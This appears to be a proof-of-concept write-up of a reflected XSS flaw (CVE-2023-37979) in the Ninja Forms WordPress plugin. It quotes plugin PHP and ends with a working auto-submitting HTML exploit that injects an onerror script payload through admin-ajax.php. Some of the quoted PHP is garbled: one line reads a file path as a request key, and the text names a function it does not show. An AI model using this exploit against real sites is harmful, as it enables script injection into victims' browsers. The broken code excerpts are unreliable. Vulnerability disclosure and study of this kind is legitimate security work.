# CVSS score: 7.1
# Date: 2023-07-27

## XSS in Ninja Forms wordpress plugin
## This plugin is one of the most famous plugins for creating forms and has more than 800,000 active installations
![Alt text](https://github.com/Fire-Null/CVE-2023-37979/blob/main/images/1.jpg)

## Quick check
#### This vulnerability was found on July 7, which allows JavaScript to run on the user's browser
### So How Does the exploit work?
#### Due to the lack of validation of the sent parameter and its direct display in the browser, it is possible to execute JavaScript code and this vulnerability exists in versions 3.6.25 and above. The following request is to load a form template whose action is nf_batch_process.
![Alt text](https://github.com/Fire-Null/CVE-2023-37979/blob/main/images/2.png)
#### In the include/AJAX/REST/Controller.php file, a parameter called method_override is received through the POST method, "which is not present in the above request, the value of this parameter is the name of the class method that must be overwritten.
```php
public  function  route()
{
register_shutdown_function( array( $this, 'shutdown' ) );

$method = strtolower( $_SERVER['REQUEST_METHOD'] );

if( 'post' == $method and isset( $_REQUEST[ 'method_override' ] ) ){

$method = sanitize_text_field( $_REQUEST[ 'includes\AJAX\REST\Controller.php' ] );

}

 
if( ! method_exists( $this, $method ) ){

$this->_errors[] = esc_html__( 'Endpoint does not exist.', 'ninja-forms' );

$this->_respond();

}


$request_data = $this->get_request_data();

 
try {

$data = $this->$method($request_data);

$this->_respond( $data );

} catch( Exception  $e ) {

$this->_errors[] = $e->getMessage();

}

$this->_respond();

}
```
#### In the includes\AJAX\REST\BatchProcess.php file, in the get_request_data function, a parameter called data is found through the POST method, "which is not validated, and this parameter is not present in the request data.
```php
protected  function  _respond( $data = array() )

{
if( empty( $data ) ){

$data = $this->_data;

}
if( isset( $this->_data['debug'] ) ) {

$this->_debug = array_merge( $this->_debug, $this->_data[ 'debug' ] );

}
if( isset( $this->_data['errors'] ) && $this->_data[ 'errors' ] ) {

$this->_errors = array_merge( $this->_errors, $this->_data[ 'errors' ] );

}

do_action( 'ninja_forms_before_response', $data );

$response = array( 'data' => $data, 'errors' => $this->_errors, 'debug' => $this->_debug );
echo  wp_json_encode( $response );
wp_die(); // this is required to terminate immediately and return a proper response
}
}
```
#### Finally, by adding data and method_override parameters to the Load Template request and rewriting the _respond method using the method_override parameter, an XSS vulnerability occurs.
![Alt text](https://github.com/Fire-Null/CVE-2023-37979/blob/main/images/3.png)
![Alt text](ihttps://github.com/Fire-Null/CVE-2023-37979/blob/main/images/4.png)
#### This vulnerability can be exploited by giving the user a link containing the Exploit code.
#### Exploit code:
```html
<html>
<body>
<form  action="http://localhost/wordpress/wp-admin/admin-ajax.php"  method="POST">
<input  type="hidden"  name="action"  value="nf&#95;batch&#95;process"  />
<input  type="hidden"  name="batch&#95;type"  value="import&#95;form&#95;template"  />
<input  type="hidden"  name="security"  value="e29f2d8dca"  />
<input  type="hidden"  name="extraData&#91;template&#93;"  value="formtemplate&#45;contactformd"  />
<input  type="hidden"  name="method&#95;override"  value="&#95;respond"  />
<input  type="hidden"  name="data"  value="firenull&quot;&#125;&#125;&lt;img&#32;src&#61;firenull&#32;onerror&#61;alert&#40;String&#46;fromCharCode&#40;88&#44;83&#44;83&#41;&#41;&gt;"  />
<input  type="submit"  value="Submit request"  />
</form>
<script>
history.pushState('', '', '/');
document.forms[0].submit();
</script>
</body>
</html>
```
